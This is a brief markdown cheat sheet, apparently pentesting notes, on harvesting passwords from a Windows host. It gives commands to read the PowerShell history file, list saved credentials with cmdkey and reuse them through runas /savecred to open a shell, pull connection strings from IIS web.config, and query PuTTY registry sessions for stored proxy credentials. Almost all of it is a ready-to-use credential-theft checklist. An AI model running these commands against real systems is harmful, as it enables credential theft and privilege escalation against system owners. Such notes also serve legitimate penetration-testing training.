### Harvesting Password
  ####　Powershell History　　－　in cmd
    type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    // To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 

  #### Saved Windows Credentials
    cmdkey /list
    //runas to view a username in the list, nad launch a cmd
    runas /savecred /user:xxx cmd.exe

  #### IIS Configuration
    type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
    or C:\inetpub\wwwroot\web.config

  #### Retrieve Credentials from Software: PuTTY
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  
      // Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.

  
